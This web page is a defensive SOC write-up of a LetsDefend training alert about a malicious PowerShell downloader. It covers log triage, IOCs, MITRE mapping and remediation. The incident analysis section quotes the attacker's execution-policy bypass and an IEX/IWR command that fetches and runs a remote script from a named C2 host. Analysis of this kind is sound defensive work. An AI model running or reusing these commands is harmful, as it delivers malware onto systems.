<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Event ID: 238
Rule Name: SOC153 – Suspicious PowerShell Script Executed
Severity: HIGH
Category: Endpoint Compromise / Malware
Event Time: March 14, 2024 – 05:23 PM
Compromised Host: Tony (172.16.17.206)
Tony at work opened a suspicious file they probably shouldn&amp;rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&amp;rsquo;t know what&amp;rsquo;s on it, but it starts doing things automatically." />
<meta name="keywords" content=", letsdefend, soc, blue-team, malware-analysis, powershell, endpoint-security" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/letsdefend/alerts/soc153---suspicious-powershell-script-executedname/" />


    <title>
        
            SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection :: Hello w3nch 
        
    </title>





  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">




    
        <link rel="stylesheet" type="text/css" href="css/code.css">
    

    
        <link rel="stylesheet" type="text/css" href="css/writeups.css">
    


    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection">
<meta itemprop="description" content="Event ID: 238
Rule Name: SOC153 – Suspicious PowerShell Script Executed
Severity: HIGH
Category: Endpoint Compromise / Malware
Event Time: March 14, 2024 – 05:23 PM
Compromised Host: Tony (172.16.17.206)
Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&rsquo;t know what&rsquo;s on it, but it starts doing things automatically."><meta itemprop="datePublished" content="2026-02-03T00:00:00+00:00" />
<meta itemprop="dateModified" content="2026-02-03T00:00:00+00:00" />
<meta itemprop="wordCount" content="729">
<meta itemprop="keywords" content="letsdefend,soc,blue-team,malware-analysis,powershell,endpoint-security," />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection"/>
<meta name="twitter:description" content="Event ID: 238
Rule Name: SOC153 – Suspicious PowerShell Script Executed
Severity: HIGH
Category: Endpoint Compromise / Malware
Event Time: March 14, 2024 – 05:23 PM
Compromised Host: Tony (172.16.17.206)
Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer you don&rsquo;t know what&rsquo;s on it, but it starts doing things automatically."/>





    <meta property="article:section" content="SOC Writeups" />

    <meta property="article:section" content="Malware &amp; Endpoint" />



    <meta property="article:published_time" content="2026-02-03 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                hello ;)</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner">
                <li><a href="/about/">About</a></li>
            
                <li><a href="/posts/">Blog</a></li>
            
                <li><a href="/contact/">Contact</a></li>
            
                <li><a href="/resume.pdf">Resume</a></li>
            
                <li><a href="/writeups/">Writeup</a></li>
            
    </ul>
</nav>


                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            
    <div class="content">
        <main class="post">

            <div class="post-info">
                
                </p>
            </div>

            <article>
                <h2 class="post-title"><a href="http://localhost:1313/writeups/letsdefend/alerts/soc153---suspicious-powershell-script-executedname/">SOC153 Case Study: Malicious PowerShell Execution Leading to Active Malware Infection</a></h2>

                
                
                

                <div class="post-content">
                    <p><strong>Event ID:</strong> 238<br>
<strong>Rule Name:</strong> SOC153 – Suspicious PowerShell Script Executed<br>
<strong>Severity:</strong> HIGH<br>
<strong>Category:</strong> Endpoint Compromise / Malware<br>
<strong>Event Time:</strong> March 14, 2024 – 05:23 PM<br>
<strong>Compromised Host:</strong> Tony (172.16.17.206)</p>
<p>Tony at work opened a suspicious file they probably shouldn&rsquo;t have. It was like finding a strange USB drive in the parking lot and plugging it into your computer  you don&rsquo;t know what&rsquo;s on it, but it starts doing things automatically.It ran some code that gave access to the malicious actors who have now taken over the system in this scenario.</p>
<h2 id="incident-analysis-summary">Incident Analysis Summary</h2>
<table>
<thead>
<tr>
<th><strong>Field</strong></th>
<th><strong>Analysis</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Alert Name</strong></td>
<td>SOC153 - Suspicious Powershell Script Executed</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High (Potential Malware Execution)</td>
</tr>
<tr>
<td><strong>Event ID</strong></td>
<td>238</td>
</tr>
<tr>
<td><strong>Event Time</strong></td>
<td>Mar 14, 2024, 05:23 PM</td>
</tr>
<tr>
<td><strong>Compromised Host</strong></td>
<td>Tony (172.16.17.206)</td>
</tr>
</tbody>
</table>
<h2 id="1-alert-overview">1. Alert Overview</h2>
<p>The alert was triggered due to the execution of a suspicious PowerShell script (<code>payload_1.ps1</code>) on an endpoint. The detection indicated potential malware or unwanted software execution using PowerShell with execution policy bypass techniques.</p>
<p>Initial triage required verification of logs to determine whether the activity represented a <strong>false positive</strong> or a <strong>successful attack</strong>.</p>
<p><img src="https://i.ibb.co/0v6tVcd/Pasted-image-20260203161116.png" alt=""></p>
<h2 id="2-detection--verification">2. Detection &amp; Verification</h2>
<p>Log analysis was conducted in <strong>Log Management</strong> by searching for the affected host IP:</p>
<p><strong>Client IP:</strong> <code>172.16.17.206</code></p>
<p>The following log sources were reviewed:</p>
<ul>
<li>Firewall logs</li>
<li>DNS logs</li>
<li>Proxy logs</li>
<li>Endpoint / OS logs
PowerShell operational logs confirmed execution of:</li>
<li><code>payload_1.ps1</code></li>
<li>Execution time: <strong>05:23 PM</strong>
The script execution was observed under **PowerShell Event ID <a href="https://www.myeventlog.com/search/show/980">4104</a>, confirming script block logging.  Based on this evidence, the alert was verified as a <strong>True Positive</strong>.</li>
</ul>
<p><img src="https://i.ibb.co/JjMzT7LP/Pasted-image-20260203161456.png" alt=""></p>
<h2 id="3-incident-analysis">3. Incident Analysis</h2>
<h3 id="initial-access--drive-by-compromise">Initial Access – Drive-by Compromise</h3>
<p>A search for <code>payload_1.ps1</code> revealed the following download source in proxy logs:</p>
<pre tabindex="0"><code class="language-url" data-lang="url">hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
</code></pre><p><img src="https://i.ibb.co/Xxr9JFd0/Pasted-image-20260203161819.png" alt=""></p>
<ul>
<li>Proxy action: <strong>Allowed</strong></li>
<li>No associated phishing email found in Email Security logs
<strong>Conclusion:</strong>  Initial access occurred via <strong>Drive-by Compromise</strong>, where the user downloaded and executed a malicious script from the web rather than through email.</li>
</ul>
<h3 id="malware-execution">Malware Execution</h3>
<p>The malicious PowerShell script was executed from the user’s
<strong>Downloads</strong> directory and bypassed execution policy restrictions using the following command:
<img src="https://i.ibb.co/svjJn1c5/Pasted-image-20260203161256.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ExecutionPolicy -Scope <span style="color:#66d9ef">Process</span> Bypass
</span></span></code></pre></div><p>Observed execution command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -Command IEX(IWR -UseBasicParsing <span style="color:#e6db74">&#39;hxxps://kionagranada.com/upload/sd2.ps1&#39;</span>)
</span></span></code></pre></div><p>This confirms:</p>
<ul>
<li>User execution</li>
<li>PowerShell abuse</li>
<li>Execution policy bypass</li>
</ul>
<h3 id="command--control-c2-activity">Command &amp; Control (C2) Activity</h3>
<p>Threat intelligence and log analysis identified outbound communication to:
<img src="https://i.ibb.co/PzbLWJkC/Pasted-image-20260203161126.png" alt=""></p>
<pre tabindex="0"><code class="language-url" data-lang="url">kionagranada[.]com
</code></pre><p>Resolved IP:</p>
<pre tabindex="0"><code class="language-ip" data-lang="ip">161[.]22[.]46[.]148
</code></pre><ul>
<li>AV/EDR detected the malicious activity</li>
<li><strong>Malware NOT quarantined/cleaned</strong> (active on system)</li>
<li>Execution observed in process logs
Firewall logs confirmed <strong>successful outbound connections</strong>, validating active <strong>Command &amp; Control communication</strong>.</li>
</ul>
<h2 id="4-reputation--threat-intelligence">4. Reputation &amp; Threat Intelligence</h2>
<p>The SHA-256 hash of <code>payload_1.ps1</code> was analyzed using VirusTotal:
<img src="https://i.ibb.co/Tq4yBbYr/Pasted-image-20260203161551.png" alt=""></p>
<h3 id="virustotal-findings">VirusTotal Findings</h3>
<ul>
<li><strong>46 / 71 vendors</strong> flagged the file as malicious</li>
<li>Classified as <strong>Trojan / PowerShell Downloader</strong></li>
<li>Associated with additional payload delivery</li>
<li>Network indicators linked to known malicious infrastructure</li>
</ul>
<h4 id="notable-powershell-cmdlets-observed">Notable PowerShell Cmdlets Observed</h4>
<ul>
<li><code>Invoke-WebRequest (IWR)</code> – Remote payload retrieval</li>
<li><code>Invoke-Expression (IEX)</code> – In-memory execution</li>
<li><code>New-Object</code> – Object instantiation</li>
<li><code>Where-Object</code> – Data filtering</li>
<li><code>Write-Output</code> – Script output handling</li>
</ul>
<p><img src="https://i.ibb.co/BVZ5ysXz/Pasted-image-20260203161623.png" alt=""></p>
<h2 id="5-indicators-of-compromise-iocs">5. Indicators of Compromise (IOCs)</h2>
<table>
<thead>
<tr>
<th>Category</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>File Name</td>
<td>payload_1.ps1</td>
</tr>
<tr>
<td>SHA-256</td>
<td>db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0</td>
</tr>
<tr>
<td>C2 Domain</td>
<td>kionagranada.com</td>
</tr>
<tr>
<td>C2 IPs</td>
<td>161[.]22.46.148, 91[.]236.116.163</td>
</tr>
<tr>
<td>Malicious URLs</td>
<td>hxxps://kionagranada.com/upload/sd2.ps1</td>
</tr>
<tr>
<td>Host IP</td>
<td>172[.]16.17.206</td>
</tr>
</tbody>
</table>
<p><img src="https://i.ibb.co/G3kTwJZX/Pasted-image-20260203165107.png" alt=""></p>
<h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK Mapping</h2>
<table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Drive-by Compromise</td>
<td>T1189</td>
</tr>
<tr>
<td>Execution</td>
<td>PowerShell</td>
<td>T1059.001</td>
</tr>
<tr>
<td>Execution</td>
<td>User Execution</td>
<td>T1204</td>
</tr>
<tr>
<td>Defense Evasion</td>
<td>Execution Policy Bypass</td>
<td>T1562</td>
</tr>
<tr>
<td>Command &amp; Control</td>
<td>Web Protocols</td>
<td>T1071.001</td>
</tr>
<tr>
<td>Command &amp; Control</td>
<td>Ingress Tool Transfer</td>
<td>T1105</td>
</tr>
</tbody>
</table>
<h2 id="7-sigma-rule-and-yara-rule">7. Sigma Rule and Yara Rule</h2>
<ul>
<li>Sigma: <a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC153%20-%20Suspicious%20Powershell%20Script%20ExecutedName/Suspicious%20PowerShell%20IEX%20with%20Web%20Download.yml">Suspicious PowerShell IEX with Web Download</a></li>
<li>Yara: <a href="https://github.com/w3nch/YARA-rules/blob/main/SOC153%20Event%20ID%20238/Malicious_PowerShell_Downloader.yml">Malicious_PowerShell_Downloader</a></li>
</ul>
<h2 id="immediate-actions-taken">Immediate Actions Taken</h2>
<ol>
<li><strong>Containment</strong>: Endpoint containment initiated via EDR</li>
<li><strong>C2 Confirmation</strong>: Verified C2 communication occurred</li>
<li><strong>Threat Indicator</strong>: Marked as malicious infrastructure</li>
</ol>
<h2 id="recommended-next-steps">Recommended Next Steps</h2>
<h3 id="short-term-remediation">Short-term (Remediation):</h3>
<ul>
<li>Isolate host &ldquo;Tony&rdquo; from network</li>
<li>Perform full malware scan/removal</li>
<li>Reset credentials for affected user account</li>
<li>Block C2 domains at firewall/proxy level</li>
</ul>
<h3 id="medium-term-prevention">Medium-term (Prevention):</h3>
<ul>
<li>Implement PowerShell logging (Module/Transcript)</li>
<li>Restrict PowerShell execution policies</li>
<li>Enhance endpoint detection rules for IEX/IWR patterns</li>
<li>User awareness training on suspicious downloads</li>
</ul>
<h3 id="long-term-hardening">Long-term (Hardening):</h3>
<ul>
<li>Application whitelisting for PowerShell</li>
<li>Implement AMSI (Anti-Malware Scan Interface)</li>
<li>Regular security baseline reviews</li>
</ul>
<h2 id="final-assessment">Final Assessment</h2>
<p><strong>True Positive - Active Malware Infection</strong></p>
<p>The incident represents a successful malware execution with confirmed C2 communication. The attacker achieved initial access through user execution of a malicious PowerShell script, bypassed security controls, and established remote command capabilities.</p>
<p><strong>Risk Level</strong>: CRITICAL</p>
<ul>
<li>Data exfiltration possible</li>
<li>Lateral movement potential</li>
<li>Persistence mechanisms likely installed</li>
</ul>
<p>Lessons Learned</p>
<ul>
<li>User awareness training is critical to prevent execution of unknown scripts</li>
<li>PowerShell execution policies alone are insufficient</li>
<li>Script block logging (Event ID 4104) is essential for detection</li>
<li>Web-based payload delivery must be monitored and restricted</li>
<li>EDR solutions must actively block, not just alert</li>
</ul>

                </div>
            </article>

            <hr />

            <div class="post-info">
                
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/letsdefend/">letsdefend</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/blue-team/">blue-team</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/malware-analysis/">malware-analysis</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/powershell/">powershell</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/endpoint-security/">endpoint-security</a></span>
        
    </p>

                
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/soc-writeups/">SOC Writeups</a></span>
        <span class="tag"><a href="http://localhost:1313/categories/malware-endpoint/">Malware &amp; Endpoint</a></span>
        
    </p>

            </div>
        </main>
    </div>


            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Hugo</span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>




    </body>
</html>
